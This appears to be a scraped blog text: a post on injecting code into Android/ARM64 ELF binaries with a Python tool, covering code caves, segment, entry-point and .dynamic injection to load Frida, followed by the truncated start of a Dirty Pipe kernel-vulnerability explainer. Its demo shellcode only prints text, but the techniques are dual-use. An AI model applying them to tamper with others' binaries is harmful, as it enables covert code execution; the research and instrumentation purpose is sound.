LIEF desperately tries to keep the binary intact. For that LIEF inserts new memory, shuffles segments around and maybe more when just opening and closing the binary. E.g.\nbinary = lief.parse(\u0026#39;/bin/ls\u0026#39;) binary.write(\u0026#39;./tmp\u0026#39;) will \u0026ldquo;build\u0026rdquo; the binary, i.e. internally calling\nbuilder = lief.ELF.Builder(binary) builder.build() which will insert memory (out of nowhere). One could make the hypothesis that LIEF wants to \u0026ldquo;prepare\u0026rdquo; the binary for future manipulation and thus already allocates enough space to support e.g. quick PHT injections.\nAlso LIEF does not provide all necessary functionality to implement the techniques described in this post. E.g. LIEF does not support overwriting a PHT - entry without modifying the linked memory.\nTo that end, a custom parser is utilised. It supports all necessary functionality that LIEF is lacking or not willing to provide, because it might break correctness. The custom parser, rawelf_injection, takes the name of a binary as an input and performs the requested operations.\nAn issue is that when calling rawelf_injection, LIEF needs to store the current state of the binary to a temporary file and reparse that file after rawelf_injection is done. This will result in references to objects, that are related to the state of a LIEF - binary before storing the binary to a file, being invalid after LIEF reparsed the binary.\nOther problems emerging from using two parsers at the same time will be mentioned throughout the following sections.\nCode Injection Inserting code into the binary can be as easy as just overwriting existing code in .text and as hard as inserting a new segment and a corresponding PHT - entry. Interestingly, not all of the following techniques are applicable in a fixed setting, thus the user of ElfInjection has to know what he/she is doing when performing code injection.\nAs rawelf_injection has been designed w.r.t. the System V gABI, applying it to ELF - files constructed for Android on AARCH64 was assumed to work just out-of-the-box (except for relocations). rawelf_injection has only been tested on Ubuntu 20.04 LTS on AMD64 up to the date I started applying the techniques to ELF - files run on an Android emulator. Lets first look at an overview of the challenges I experienced before diving into the details:\nUnfortunately, it turns out that rawelf_injection does not support platform - independent injection techniques, as OS vendors apparently are allowed to deviate partially from the System V gABI. On the other hand, for different architectures, there are different CPU instructions, like e.g. adrp, that introduce unwanted side effects when inserting new memory.\nSo lets list the challenges and then try to solve them:\nInserting new memory into a binary can invalidate cross - references (e.g. adrp). Loadable segments should not overlap (see linker_phdr.cpp ; user has to ensure that loadables do not overlap) Platform - specific ELF patches (adjust rawelf_injection to AARCH64 processor supplement) Dynamic linker (see .dynsym - based injection for details) Problem with adrp Lets assume we want to inject code into an ARM64 - PIE on Android (API level 31, Pixel 3). Then, using NDK r23b\u0026rsquo;s toolchain (i.e. ndk-build) to compile the program\n#include \u0026lt;stdio.h\u0026gt; ìnt main() { puts(\u0026#34;Hello World!\\n\u0026#34;); return 0; } there will be at least one .plt - entry that handles all calls to puts. The corresponding .plt - stub may look like this:\n$ aarch64-linux-gnu-objdump -j .plt -d hello ... 00000000000006a0 \u0026lt;__libc_init@plt-0x20\u0026gt;: 6a0: a9bf7bf0 stp x16, x30, [sp, #-16]! 6a4: b0000010 adrp x16, 1000 \u0026lt;puts@plt+0x920\u0026gt; 6a8: f944a211 ldr x17, [x16, #2368] 6ac: 91250210 add x16, x16, #0x940 6b0: d61f0220 br x17 ... 00000000000006e0 \u0026lt;puts@plt\u0026gt;: 6e0: b0000010 adrp x16, 1000 \u0026lt;puts@plt+0x920\u0026gt; 6e4: f944ae11 ldr x17, [x16, #2392] 6e8: 91256210 add x16, x16, #0x958 6ec: d61f0220 br x17 Notice that adrp will first compute 0x6e0 + 0x1000 and then zero out the least-significant 12 bits (related to page size). Thus x16 will contain 0x1000. Then x17 will contain the value located at address 0x1000 + 0x958 (i.e. 0x958 = 2392), which is the second to last .got.plt - entry, containing the address of the dynamic linker stub (see address 0x6a0 in objdump - output):\n$ readelf --wide --sections hello [Nr] Name Type Address Off Size ES Flg Lk Inf Al ... [22] .got.plt PROGBITS 0000000000001930 000930 000030 00 WA 0 0 8 ... $ readelf --wide --hex-dump=22 hello ... 0x00001950 a0060000 00000000 a0060000 00000000 ................ Inserting data into the binary can now result in broken references. Lets consider the example that we want to append a new PHT - entry to PHT. Assuming the above platform and build, the PHT is located at\n$ readelf --wide --segments hello Type Offset VirtAddr PhysAddr FileSiz MemSiz Flg Align ... PHDR 0x000040 0x0000000000000040 0x0000000000000040 0x000230 0x000230 R 0x8 ... Appending the PHT - entry will increase the PHDR\u0026rsquo;s size by 0x38, which again will shift everything located after the PHT by 0x38 to the back. Lets consider .plt again\n00000000000006e0 \u0026lt;puts@plt\u0026gt;: 6e0 + 0x38: b0000010 adrp x16, 1000 --\u0026gt; x16 = 0x1000 6e4 + 0x38: f944ae11 ldr x17, [x16, #2392] --\u0026gt; x17 = 0x1000 + 0x958 = 0x1958 6e8 + 0x38: 91256210 add x16, x16, #0x958 --\u0026gt; x16 = 0x1958 6ec + 0x38: d61f0220 br x17 So we will still jump to the same .plt - stub we would jump to, if we did not insert the PHT - entry. In (almost) all cases, this will give you SIGSEG or SIGILL. This is a problem to consider whenever new data is injected into a binary. Despite the fact that we have to take care of unpatchable references, there are also patchable references that can be changed automatically (i.e. using heuristics and math) like e.g. .dynamic entries of tag DT_SYMTAB.\nIn addition to that, if we assumed that we inserted a loadable segment, i.e. a PHT - entry of type PT_LOAD, then the binary might crash with high probability (for me it crashed on every test). Regarding the kernel , loadable segments are allowed to overlap, which coincides with System V gABI (notice the absense of any constraints for segments in comparison to the constraints enforced for sections ). This may lead to the conclusion that either inserting an overlapping loadable segment introduces the same errors regarding adrp as described above, or the dynamic linker contains code that sends a SIGSEG or SIGILL based on a certain condition. As all of the techniques are tested on an Android emulator with the above platform specifications, it could also be that the translator does not like overlapping loadables (/system/bin/ndk_translation_program_runner_binfmt_misc_arm64 is definitely capable of triggering SIGILL!).\nCode Cave - based Injection The first technique described is code injection that relies on finding unused memory between two loadable segments, i.e. segments of type PT_LOAD. For this technique to work properly, we need to consider the following things:\nThis is a segment - based approach, which means that code caves must lie between two loadable segments. Thus a code cave cannot be part of the process image. Assuming we found a code cave, in order to put it into the process image we need to either create a new or overwrite an existing PHT - entry such that it points to the code cave. Or we need to expand one of the surrounding loadable segments. The latter is hard, because loadable segments may theoretically contain other loadable segments. Therefore only \u0026ldquo;top - level\u0026rdquo; loadable segments are used to search for code caves. Segment - based code caves need to be searched for with respect to the file offsets and file sizes of the \u0026ldquo;top - level\u0026rdquo; loadable segments, because the code injection takes place in the file on disk, not at runtime. Again there is a problem, because the size of a segment on disk p_filesz may be strictly less than the size in the process image p_memsz. Appending a code cave to a loadable segment with p_filesz \u0026lt; p_memsz may result in the injected code being overwritten by the application. Also, if combined with a PHT - based injection, one can set the virtual address and memory size to another code cave in process image. System V gABI states that PHT - entries of loadable segments must be sorted ascendingly wrt. their virtual addresses. Therefore the combination of a code cave with overwriting/creating PHT - entries is further limited to the order of PHT - entries. In practice it seems that we can derive from the kernel code that only the first loadable segment needs to have the smallest virtual address s.t. load_bias is correctly set (see also the dynamic linker code responsible for calculating the load_bias for ELF - files loaded by the kernel). There seem to be no checks regarding the order of loadable segments as regards their virtual addresses. Notice that inserting a PHT - entry to point to the code cave will cause all the problems described in Code Injection .\nInjecting code into segment - based code caves is a simple and often stable way to get a binary to execute custom code. Of course seeking code caves can among other things involve analysing control flow to detect \u0026ldquo;dead\u0026rdquo; code in e.g. .text that can be overwritten.\nThe following figure illustrates overwriting an existing PHT - entry such that it points to a segment - based code cave. Segment - based Injection This technique involves everything related to segments that is not already part of code cave - based injection . To be precise, the following subtechniques can be formed:\nOverwrite an existing PHT - entry and overwrite an existing memory region. This is an abstraction of overwriting an existing PHT - entry such that it points to a segment - based code cave. Of course the PHT - entry should point to the overwritten memory, which can be a segment that is not part of the process image or something else. Overwrite an existing PHT - entry and insert new memory to be interpreted as a segment. Inserting new memory will result in problems related to cross - references described in Code Injection . Also this will result in a \u0026ldquo;dead\u0026rdquo; memory region, because the memory region the overwritten PHT - entry was referencing is not interpreted as a segment anymore. Insert a new PHT - entry and overwrite an existing memory region. This is again an abstraction of a code cave - based injection technique, but now arbitrary memory can be interpreted as a segment (notice that the memory region we overwrite is not limited to memory regions between loadable segments as in Code - Cave - based Injection ). Although it can happen that two PHT - entries reference the same memory region. Again note that inserting a new PHT - entry may invalidate cross - references. Finally one can insert a new PHT - entry and a new memory region. As long as one can manage validating cross - references, this technique is the least intrusive one and is even reversible. The following figure depicts inserting a completely new segment: Thinking back to using two parsers , we can see that the \u0026ldquo;mixed\u0026rdquo; techniques are problematic. To be precise, after calling rawelf_injection, LIEF will cause a segmentation fault during its parsing phase. It might be related to the fact that both \u0026ldquo;mixed\u0026rdquo; techniques result in some form of \u0026ldquo;dead\u0026rdquo; memory, i.e. either a \u0026ldquo;dead\u0026rdquo; PHT - entry or a \u0026ldquo;dead\u0026rdquo; memory region. A solution is to avoid reparsing, i.e. call rawelf_injection independently from LIEF.\nCode Execution Making already injected code executable is key to seeing any signs of life of our code. Technically speaking, there is a plethora of ways to make code executable, but most of them are highly platform - dependent. Thus we try to focus on the most abstract methods to archive code execution.\nLIEF fully supports all following approaches, which prevents compatibility issues between the two parsers.\nEntry Point The most natural approach is to overwrite the entry point address e_entry located in the ELF - header. However, it might be unclear what to write into e_entry at the first glance. e_entry is a virtual address pointing to the first instruction executed after the OS/dynamic linker is done setting up the execution environment. As all code injection techniques discussed above work with file offsets, there needs to be a translation from file offet to virtual address. Fortunately, LIEF provides us with a function that does exactly that\nvaddr = binary.offset_to_virtual_address(off) Theoretically the conversion can be done manually aswell. For that assume that the injected code is part of a loadable segment (of type Elf64_Phdr). Then\nvaddr = (off - seg.p_offset) + seg.p_vaddr Intuition behind that is that the relative offset of a structure to the beginning of the segment that contains the structure will remain the same, regardless of whether we are in the process image or in the file. Note that this conversion might not work in general.\nThe following picture shows the general idea of this technique: .dynsym - based Injection Another idea to make code executable would be to define a symbol such that it points to the injected code. This technique is dependent on the Dynamic Linker, because the dynamic linker determines how a symbol is resolved at runtime. We would need the following assumptions:\nDynamic Linker will not resolve a symbol, if there is already a non - zero definition in .dynsym, and will use that existing definition. Target binary uses Dynamic Linking. .dynamic neither contains an entry with tag DT_BIND_NOW nor any other platform - dependent entry that enforces non - lazy binding. Also there must not be an entry with tag DT_FLAGS and value DF_BIND_NOW. This is rather nice to have than necessary, because lazy binding allows for injected code to be executed before a symbol is resolved, thus leaving a time window, in which symbol resolution can be manipulated. This time we are out of luck though. At least one of the above assumptions does not hold on our target platform and thus this technique is not applicable! If we were to manipulate relocations, we might be able to get a similar technique to work. Although it would not require .dynsym.\nThe Tradegy of Lazy Binding For this section we assume that we are looking at an Android OS (e.g. 12) on an ARM64 (i.e. AARCH64) architecture. For these platform specifications I want to explain that the dynamic linker always uses BIND_NOW, i.e. non - lazy binding!\nLets remember that, if we execute a binary (e.g. using execve), the kernel will load the binary into memory. According to AOSP , we can derive the following call stack:\nOrder Function Call Line 1. syscall(execve, argv, envp) - 2. do_execve(getname(filename), argv, envp) line 3. do_execveat_common(AT_FDCWD, filename, argv, envp, 0) line 4. bprm_execve(bprm, fd, filename, flags) line 5. exec_binprm(bprm) line 6. search_binary_handler(bprm) line 7. fmt-\u0026gt;load_binary(bprm) line In the file common/fs/binfmt_elf.c we can find the corresponding binary format that is registering load_elf_binary as the function that is called last in the call stack. Investigating that function leads us to the conclusion that the kernel may handle loading the binary. Also we can see that if the program to be executed uses an interpreter, i.e. there is a segment of type PT_INTERP, then the kernel will set the entry point to the entry point of the interpreter and start a thread at this entry point .\nThis brings us to the dynamic linker, whose \u0026ldquo;nice\u0026rdquo; entry point is linker_main . Of course we assume that we are looking at a binary that has at least one DT_NEEDED - entry in .dynamic. This will trigger a call to the function find_libraries . This function tries to load all dynamic dependencies in a very complex way. Eventually it will call soinfo::link_image with a lookup list containing descriptions of shared libraries to consider while linking:\nif (!si-\u0026gt;link_image(lookup_list, local_group_root, link_extinfo, \u0026amp;relro_fd_offset) || !get_cfi_shadow()-\u0026gt;AfterLoad(si, solist_get_head())) { return false; } Within soinfo::link_image, there is a sneaky call to relocate :\nif (!relocate(lookup_list)) { return false; } We know that the first .plt - entry will lookup symbols, if the corresponding functions are called for the first time, in case of lazy binding. This means that we now expect corresponding relocations to take place s.t. .got.plt (according to this , .got.plt holds symbol addresses used by .plt - entries) eventually contains all function addresses before the program gets in control. Thus we will look for R_AARCH64_JUMP_SLOT relocation types. Assuming the dynamic linker is compiled with USE_RELA, it will run if (!plain_relocate\u0026lt;RelocMode::JumpTable\u0026gt;(relocator, plt_rela_, plt_rela_count_)) { return false; } Following the one-liners we will wind up in process_relocation_impl . As we are assuming that our relocation type of interest is R_AARCH64_JUMP_SLOT, we get that its r_sym refers to the corresponding .dynsym - entry and is thus not 0. This will result in an r_sym == 0 - check to be false, which triggers a symbol lookup in the corresponding else:\nif (!lookup_symbol\u0026lt;IsGeneral\u0026gt;(relocator, r_sym, sym_name, \u0026amp;found_in, \u0026amp;sym)) return false; (btw. the relocator contains lookup_list).\nAgain following the control flow will reveal a call to soinfo_do_lookup :\n... soinfo_do_lookup(sym_name, vi, \u0026amp;local_found_in, relocator.lookup_list); which, after following one - liners again, brings us to a function called soinfo_do_lookup_impl . This function will resolve a given symbol by name utilising the hash sections and symbol versioning. Eventually, it returns an instance of Elf64_Sym that is forwarded all the way back to process_relocation_impl. It will be used to compute the correct address of the symbol via\nElfW(Addr) resolve_symbol_address(const ElfW(Sym)* s) const { if (ELF_ST_TYPE(s-\u0026gt;st_info) == STT_GNU_IFUNC) { return call_ifunc_resolver(s-\u0026gt;st_value + load_bias); } return static_cast\u0026lt;ElfW(Addr)\u0026gt;(s-\u0026gt;st_value + load_bias); } As most symbols are of type STT_FUNC, we just consider the second return statement.\nFinally, the result of resolve_symbol_address(sym) is stored in sym_addr and used in\nif constexpr (IsGeneral || Mode == RelocMode::JumpTable) { if (r_type == R_GENERIC_JUMP_SLOT) { count_relocation_if\u0026lt;IsGeneral\u0026gt;(kRelocAbsolute); const ElfW(Addr) result = sym_addr + get_addend_norel(); trace_reloc(\u0026#34;RELO JMP_SLOT %16p \u0026lt;- %16p %s\u0026#34;, rel_target, reinterpret_cast\u0026lt;void*\u0026gt;(result), sym_name); *static_cast\u0026lt;ElfW(Addr)*\u0026gt;(rel_target) = result; return true; } } This will write the address of the symbol into the corresponding .got.plt - entry.\nAll in all this happens at startup of a program. We started at execve and only considered dynamic linker code that is executed before the program gets in charge (i.e. before the dynamic linker returns from linker_main). Therefore the dynamic linker always uses BIND_NOW.\nSymbol Hashing and LIEF In order to quickly determine, whether a symbol is defined in an ELF - file, two sections can be utilised:\n.gnu.hash .hash We will only focus on .gnu.hash, because it suffices for showcasing the problem.\nFrom the previous section we know that the dynamic linker performs a symbol lookup via soinfo_do_lookup_impl . To be precise, it will iterate over all libraries defined in lookup_list and use the Bloom filter in .gnu.hash to check whether a symbol is defined in an ELF - file or not. If the Bloom filter \u0026ldquo;says no\u0026rdquo;, the symbol is not defined in that ELF - file with probability assumed to be 100%. If the Bloom filter \u0026ldquo;says probably yes\u0026rdquo;, then further checks are needed to identify whether the symbol is really defined in that ELF - file (for those interested, see this ).\nThis implies that there needs to be an entry in .gnu.hash in order for the dynamic linker to take a corresponding symbol definition into account. Unfortunately, LIEF does not create a new entry in .gnu.hash upon adding a new symbol to .dynsym. Neither does rawelf_injection, as it was designed according to System V gABI, which does not even mention .gnu.hash. Therefore overwriting an existing symbol in .dynsym using rawelf_injection will also not create/overwrite a .gnu.hash - entry. This leaves us with overwriting symbols, whose symbol names are already defined in .gnu.hash of the ELF - file we are manipulating. Thus we cannot overwrite symbols that are defined in other shared object files unless we manipulate the respective libraries. Lets assume we have a symbol to overwrite, then there is a limitation to what the corresponding .dynsym - entry must look like. Notice that in soinfo_do_lookup_impl there is a call to is_symbol_global_and_defined :\ninline bool is_symbol_global_and_defined(const soinfo* si, const ElfW(Sym)* s) { if (__predict_true(ELF_ST_BIND(s-\u0026gt;st_info) == STB_GLOBAL || ELF_ST_BIND(s-\u0026gt;st_info) == STB_WEAK)) { return s-\u0026gt;st_shndx != SHN_UNDEF; } else if (__predict_false(ELF_ST_BIND(s-\u0026gt;st_info) != STB_LOCAL)) { DL_WARN(\u0026#34;Warning: unexpected ST_BIND value: %d for \\\u0026#34;%s\\\u0026#34; in \\\u0026#34;%s\\\u0026#34; (ignoring)\u0026#34;, ELF_ST_BIND(s-\u0026gt;st_info), si-\u0026gt;get_string(s-\u0026gt;st_name), si-\u0026gt;get_realpath()); } return false; } This function has to return true in order for our symbol to be returned by soinfo_do_lookup_impl. Therefore, its binding must ensure that the symbol is globally available, i.e. either STB_GLOBAL or STB_WEAK, and the symbol has to be defined in relation to some section, whose index is not 0. (We have not talked about symbol version checks yet that introduce further complexity if there is a section of type SHT_VERSYM. Note that check_symbol_version also has to return true for the symbol resolution to succeed.)\nThus manipulating .dynsym of an ELF - file is limited to the symbols that have a corresponding .gnu.hash - entry.\nCombining the facts that the dynamic linker defaults to BIND_NOW and uses hash tables like .gnu.hash and .hash, overwriting a .dynsym - entry will be ignored and changes in e.g. .got.plt will be overwritten, if there is no corresponding hash entry. Having lazy - binding would relax the situation a bit, as the symbol lookup would be delayed as much as possible, allowing further manipulations at runtime. BIND_NOW enforces the existence of a hash table entry at startup in order for .dynsym - based injection to work. Alternatively we could overwrite a relocation entry of type R_AARCH64_JUMP_SLOT, which does not seem to require any other changes than in .rel(a).plt.\n.dynamic - based Injection Finally, the most common technique is described. This approach requires dynamic linking, i.e. if the target binary is statically linked and there is no .dynamic - section, then this technique will not work. Also we assume that all inserted .dynamic - entries have the tag DT_NEEDED to allow loading arbitrary shared object files. The corresponding d_val is an offset into .dynstr.\nThe following subtechniques can be derived:\nInserting a new .dynamic - entry into .dynamic and a new string into .dynstr. Like in segment - based injection, this is the least intrusive and only reversible technique and is supported by LIEF. One issue is that it requires new memory to be inserted. E.g. on an ARM64 architecture with Android 12 (API level 31) and a NDK r23b build of a \u0026ldquo;Hello World\u0026rdquo; - application, .dynamic is located between .plt and .got/.got.plt. Therefore, inserting new memory will invalidate cross - references. Similar to the above, overwriting an existing .dynamic - entry and inserting a new string results in a recomputation of all patchable references. Inserting a new .dynamic - entry with a chosen string offset as d_val requires to find a \u0026ldquo;suitable\u0026rdquo; substring in .dynstr. Thinking of Frida, this substring should be of the form \u0026ldquo;substring.so\u0026rdquo;. This allows the use of configuration files for frida-gadget.so. At last we can overwrite an existing .dynamic - entry and use a \u0026ldquo;suitable\u0026rdquo; substring. Notice that some compilers (like e.g. gcc) like to generate a .dynamic - entry with tag DT_DEBUG. Its value is application - dependent. As this is marked as optional in System V gABI, it can be overwritten. If the application needs this .dynamic - entry, then you will have to restore this entry in the initialisation function of your shared object file. One main concern is that LIEF does not support using substrings. If LIEF sees that a .dynamic - entry with tag DT_NEEDED is inserted, it will insert a new string. Thus rawelf_injection will be used for substring - related techniques. Also overwriting an existing .dynamic - entry and inserting a new string is implemented by using the sequence\nbinary.remove(binary.dynamic_entries[index]) binary.add_library(string) If the .dynamic - entry indexed by index is e.g. a DT_NEEDED - entry, then LIEF will also remove the corresponding string from .dynstr. One must be cautious when removing .dynamic - entries with LIEF.\nLets consider a figure that describes the last subtechnique: Applicability Having seen all of those techniques, we should summarise what techniques are usable and under which circumstances. For that, please see the following table. The test environment is always on AMR64 and Android 12 (API level 31). Notice that we consider LIEF as a black - box and assume its correctness to be given.\nTechnique Subtype Usable Constraints \u0026amp; Challenges Insert Memory - Yes adrp, invalid cross - references, inserting memory after loadable with p_filesz=0, permissions, overlapping loadables Code Caves Extension Yes segment permissions, adrp, overlapping loadables PHT Insert Yes Insert Memory issues, possibly order of loadables, \u0026hellip; PHT Overwrite Yes finding \u0026ldquo;suitable\u0026rdquo; PHT - entry, adrp because different p_memsz, possibly order of loadables, \u0026hellip; Segments Inject(PHT)+Inject(Memory) Yes None, unless LIEF messes up Overwrite+Overwrite Rather no finding \u0026ldquo;suitable\u0026rdquo; PHT - entry, finding \u0026ldquo;suitable\u0026rdquo; segment, adrp because different p_memsz, possibly order of loadables Overwrite+Inject Rather yes Insert Memory issues, finding \u0026ldquo;suitable\u0026rdquo; PHT - entry, possibly order of loadables Inject+Overwrite Rather no Insert Memory issues, finding \u0026ldquo;suitable\u0026rdquo; segment, possibly order of loadables Entry Point - Yes need virtual address .dynsym Insert Symbol No Dynamic Linker always uses BIND_NOW, need specific hash table entries Overwrite Symbol No Insert Symbol issues .dynamic Inject(.dynamic)+Inject(.dynstr) Yes None, unless LIEF messes up Overwrite+Inject Yes None, unless LIEF messes up Inject+Substring Yes finding \u0026ldquo;suitable\u0026rdquo; substring Overwrite+Substring Yes finding \u0026ldquo;suitable\u0026rdquo; substring, finding \u0026ldquo;suitable\u0026rdquo; .dynamic - entry It is needless to say that overwriting vital structures like e.g. the ELF - header will completely break the binary. Always think about it twice when considering to overwrite something.\nAll in all we can see that most techniques work. I must emphasize that the above table is solely based on tests on a single platform for a single binary. Although theoretically correct, in practice many techniques can still fail due to bugs in the implementation on my side or deviations from specifications and standards on the vendor\u0026rsquo;s side. Also you should take the \u0026ldquo;Usable\u0026rdquo; - column with a grain of salt: it highly assumes that the user knows what he/she is doing. Blindly injecting memory will most likely result in segmentation faults.\nPractical Examples In this section we want to see whether these techniques can be used to make Frida work. Notice that for simplicity, we will only use .dynamic - based injection to get Frida to run. This is justified by the fact that writing shellcode that is able to either track down dlopen and thus libc or load a shared object file manually is non - trivial. To prove that other techniques work aswell I will provide shellcode that writes a plain \u0026ldquo;Hello World!\u0026rdquo; text to stdout and exits with code 42.\nExperiment Setup In order to test the library, one may go ahead and create an Android Virtual Device (AVD) with API level 31 or above to support aarch64 - binaries (i.e. ARM64). Then run the emulator, e.g. via console\nemulator -avd Pixel_3_API_31 where emulator is a tool in the Android SDK. The name of the AVD may differ.\nThen use adb to get a shell into the emulator using\nadb shell This assumes that there is only one emulator running. Otherwise you need to specify the avd or its debug port.\nFinally, cross-compile a C program of your choice by utilising the Android NDK or take a binary that is a result of the Ahead-Of-Time step of ART. Either way you should end up with an ELF - file. When cross - compiling a C program, use\nadb push /path/to/binary /local/data/tmp/binary to get the binary into the emulator.\nAs the python library only runs on AMD64, you should apply the techniques before pushing the ELF - file to the emulator.\nHello World - Example Lets use code cave - based injection. For simplicity, we assume that there is a code cave between loadable segments.\n#import lief from ElfInjection.Binary import ElfBinary from ElfInjection.CodeInjector import ElfCodeInjector from ElfInjection.Seekers.CodeCaveSeeker import * def main(): # 0. Introduce artificial code cave #binary = lief.parse(\u0026#39;./libs/arm64-v8a/hello\u0026#39;) #binary.add(binary.get(lief.ELF.SEGMENT_TYPES.LOAD)) #binary.add(binary.get(lief.ELF.SEGMENT_TYPES.LOAD)) #binary.write(\u0026#39;./libs/arm64-v8a/hello\u0026#39;) # 1. Setup variables shellcode = (b\u0026#39;\\x0e\\xa9\\x8c\\xd2\\x8e\\x8d\\xad\\xf2\\xee\u0026#39; + b\u0026#39;\\r\\xc4\\xf2\\xee\\xea\\xed\\xf2O\\x8e\\x8d\\xd2\\x8f,\u0026#39; + b\u0026#39;\\xa4\\xf2O\\x01\\xc0\\xf2\\xee?\\xbf\\xa9 \\x00\\x80\u0026#39; + b\u0026#39;\\xd2\\xe1\\x03\\x00\\x91\\xa2\\x01\\x80\\xd2\\x08\\x08\u0026#39; + b\u0026#39;\\x80\\xd2\\x01\\x00\\x00\\xd4@\\x05\\x80\\xd2\\xa8\\x0b\u0026#39; + b\u0026#39;\\x80\\xd2\\x01\\x00\\x00\\xd4\u0026#39;) # 2. Get the binary binary = ElfBinary(\u0026#39;./libs/arm64-v8a/hello\u0026#39;) injector = ElfCodeInjector(binary) # 3. Create cave seeker and search for caves of size # at least 0x100 seeker = ElfSegmentSeeker(0x100) caves = injector.findCodeCaves(seeker) # 4. Find suitable code cave... cave = caves[1] # 5. Adjust a loadable segment. This should also be executable! cave.size = len(shellcode) sc, _ = injector.injectCodeCave(None, cave, shellcode) # 6. Overwrite entry point to point to whereever shellcode is old = injector.overwriteEntryPoint(sc.vaddr) # 7. Store to file binary.store(\u0026#39;./libs/arm64-v8a/tmp\u0026#39;) if (__name__ == \u0026#39;__main__\u0026#39;): main() The above code will search for a code cave that is at least 0x100 bytes in size. Then it will select the second match, fill the cave with shellcode and set the entry point to point to the shellcode. Notice that the code cave will be appended to an executable segment. The target is the same binary as in the next example.\nAlso notice that we need to artificially introduce two loadable, executable segments in order to find a code cave. If such an action is necessary to perform code cave based injection, you must reconsider whether code cave based injection is the correct choice.\n.dynamic - Injection Example Finally, for .dynamic - based injection please consider the following code:\nimport lief from ElfInjection.Binary import ElfBinary from ElfInjection.CodeInjector import ElfCodeInjector from ElfInjection.Manipulators.DynamicManipulator import ElfDynamicOverwriter from ElfInjection.Manipulators.StringManipulator import ElfStringFinder def main(): # 1. Get the binary binary = ElfBinary(\u0026#39;./libs/arm64-v8a/hello\u0026#39;) injector = ElfCodeInjector(binary) # 2. Create overwriter dyn_overwriter = ElfDynamicOverwriter( tag=lief.ELF.DYNAMIC_TAGS.NEEDED, value=0, index=6 ) # 3. Create string finder str_finder = ElfStringFinder() # 4. Overwrite .dynamic entry with substring dyn_info = injector.injectDynamic( str_finder, dyn_overwriter ) # 5. Store to file binary.store(\u0026#39;./libs/arm64-v8a/tmp\u0026#39;) if __name__ == \u0026#39;__main__\u0026#39;: main() Because we are using an ElfStringFinder, there is no user - supplied string injected into .dynstr. Note that the user is responsible for providing the requested shared object file, e.g. by setting LD_LIBRARY_PATH. We are manipulating the following program\n#include \u0026lt;unistd.h\u0026gt; #include \u0026lt;string.h\u0026gt; int main() { char *text = \u0026#34;Hello World!\\n\u0026#34;; while (1) { write(1, text, strlen(text)); sleep(1); } } compiled on AMD64, Ubuntu 20.04.1 LTS with Android NDK r23b\nndk-build Investigating .dynamic yields:\nreadelf --wide --dynamic manipulated.bin ... 0x0000000000000001 (NEEDED) Shared library: [libc.so] 0x0000000000000001 (NEEDED) Shared library: [libm.so] 0x0000000000000001 (NEEDED) Shared library: [libstdc++.so] 0x0000000000000001 (NEEDED) Shared library: [libdl.so] 0x000000000000001e (FLAGS) BIND_NOW 0x000000006ffffffb (FLAGS_1) Flags: NOW PIE 0x0000000000000001 (NEEDED) Shared library: [c.so] 0x0000000000000007 (RELA) 0x1490 ... To see Frida in action, we first need to set the gadget\u0026rsquo;s bind address to an IP we can connect to (i.e. not localhost):\n{ \u0026#34;interaction\u0026#34;: { \u0026#34;type\u0026#34;: \u0026#34;listen\u0026#34;, \u0026#34;address\u0026#34;: \u0026#34;\u0026lt;IP\u0026gt;\u0026#34;, \u0026#34;port\u0026#34;: 27042, \u0026#34;on_port_conflict\u0026#34;: \u0026#34;fail\u0026#34;, \u0026#34;on_load\u0026#34;: \u0026#34;wait\u0026#34; } } Name this file \u0026ldquo;c.config.so\u0026rdquo;.\nNow run the following in separate shells to see Frida in action. The first shell should run something like this, setting up the test program.\nmv frida-gadget.so c.so LD_LIBRARY_PATH=. ./manipulated.bin And the second shell should do the tracing:\nfrida-trace -H \u0026lt;IP\u0026gt;:27042 -n \u0026#34;Gadget\u0026#34; -i \u0026#34;write\u0026#34; Sources https://cs.android.com/android https://frida.re https://frida.re/docs/gadget/ https://github.com/fkie-cad/ELFbin https://github.com/frida/frida/releases https://github.com/lief-project/LIEF https://gitlab.com/x86-psABIs/x86-64-ABI https://man7.org/linux/man-pages/man2/ptrace.2.html https://man7.org/linux/man-pages/man8/ld.so.8.html http://www.sco.com/developers/gabi/latest/contents.html http://www.sco.com/developers/gabi/latest/ch4.reloc.html ","permalink":"https://lolcads.github.io/posts/2022/07/make_frida_great_again/","tags":["Frida","ELF","Code Injection"],"title":"Make Frida Great Again"},{"categories":null,"content":"Intro This blog post reflects our exploration of the Dirty Pipe Vulnerability in the Linux kernel. The bug was discovered by Max Kellermann and described here . If you haven\u0026rsquo;t read the original publication yet, we\u0026rsquo;d suggest that you read it first (maybe also twice ;)). While Kellermann\u0026rsquo;s post is a great resource that contains all the relevant information to understand the bug, it assumes some familiarity with the Linux kernel. To fully understand what\u0026rsquo;s going on we\u0026rsquo;d like to shed some light on specific kernel internals. The aim of this post is to share our knowledge and to provide a resource for other interested individuals. The idea of this post is as follows: We take a small proof-of-concept (PoC) program and divide it into several stages. Each stage issues a system call (or syscall for short), and we will look inside the kernel to understand which actions and state changes occur in response to those calls. For this we use both, the kernel source code (elixir.bootlin.com , version 5.17.9) and a kernel debugging setup (derived from linux-kernel-debugging ). The Dirty Pipe-specific debugging setup and the PoC code is provided in a GitHub repository.\nOur Goal / Disclaimer It\u0026rsquo;s important to talk about the goal of our investigation first:\nDo we want to understand how the Linux kernel works in general? Maybe not right now\u0026hellip; Do we want to know what the vulnerability is? Why it occurs? How it can be exploited? Yes! It is important to keep in mind, what we want to achieve. The Linux kernel is a very complex piece of software. We have to leave some blind spots, but that\u0026rsquo;s absolutely okay :)\nThus, when we show kernel source code we will often hide parts that are not directly relevant for our discussion to improve readability. In general, those parts may very well be security-relevant and we encourage you to follow the links to review the original code. In particular, if you want to find your own vulnerabilities or become a kernel hacker you should spend more time to understand (all) the mechanisms and details! ;)\nPage Cache The page cache plays an important role in the Dirty Pipe vulnerability so let\u0026rsquo;s see what it is and how it works first.\nThe physical memory is volatile and the common case for getting data into the memory is to read it from files. Whenever a file is read, the data is put into the page cache to avoid expensive disk access on the subsequent reads. Similarly, when one writes to a file, the data is placed in the page cache and eventually gets into the backing storage device. The written pages are marked as dirty and when Linux decides to reuse them for other purposes, it makes sure to synchronize the file contents on the device with the updated data. source In particular, the above means that if any process on the system (or the kernel itself) requests data from a file that is already cached, the cached data is used instead of accessing the disk. Of course there are ways to influence this behavior by using flags (O_DIRECT | O_SYNC) when opening a file, or by explicitly instructing the kernel to synchronize dirty pages. You could also discard the cached pages using the sysfs pseudo file system: # echo 1 \u0026gt; /proc/sys/vm/drop_caches. However, in most situations the cached data is what is ultimately used by the kernel (and thus also the user processes).\nAt this point we can already tease what the Dirty Pipe vulnerability is all about: It 